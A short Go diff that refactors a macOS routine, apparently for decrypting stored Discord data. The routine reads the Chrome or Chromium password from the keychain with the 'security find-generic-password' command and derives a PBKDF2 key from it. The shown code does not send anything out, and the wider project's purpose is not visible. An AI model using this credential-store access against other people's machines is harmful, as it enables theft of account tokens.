@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 	"sync"
@@ -41,14 +40,11 @@ func discordV10Key(appDir string) []byte {
 
 func darwinDiscordKey() []byte {
 	for _, account := range []string{"Chrome", "Chromium"} {
-		out, err := exec.Command("security", "find-generic-password", "-wa", account).Output()
-		if err != nil {
+		password, err := crypto.RunSecurityStdout("find-generic-password", "-wa", account)
+		if err != nil || password == "" {
 			continue
 		}
-		password := strings.TrimSpace(string(out))
-		if password != "" {
-			return pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)
-		}
+		return pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)
 	}
 	return nil
 }
